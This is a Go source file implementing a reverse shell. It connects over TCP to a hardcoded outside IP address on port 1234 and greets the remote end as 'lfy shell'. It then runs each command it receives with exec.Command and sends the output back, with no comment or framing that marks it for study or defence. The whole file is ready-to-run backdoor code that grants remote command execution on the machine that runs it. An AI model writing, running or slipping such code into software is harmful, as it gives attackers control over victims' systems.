package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
)

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	ip := "139.199.203.253"
	port := "1234"

	conn, err := net.Dial("tcp", ip+":"+port)
	check(err)

	defer conn.Close()

	_, err = conn.Write([]byte("Welcome to lfy shell! \n"))
	check(err)

	r := bufio.NewReader(conn)
	var args = []string{}

	for {
		command, err := r.ReadString('\n')
		cmds := strings.Split(string(command), " ")
		cmd := cmds[0]
		cmd = strings.Replace(cmd, "\n", "", -1)
		if len(cmds) > 1 {
			args = cmds[1:]
			args[len(args)-1] = strings.Replace(args[len(args)-1], "\n", "", -1)
		}

		cmdout := exec.Command(cmd, args...)
		out, err := cmdout.CombinedOutput()
		if err != nil {
			_, err := conn.Write([]byte(err.Error() + "\n"))
			check(err)
		} else {
			_, err := conn.Write([]byte(out))
			check(err)
		}
	}
}
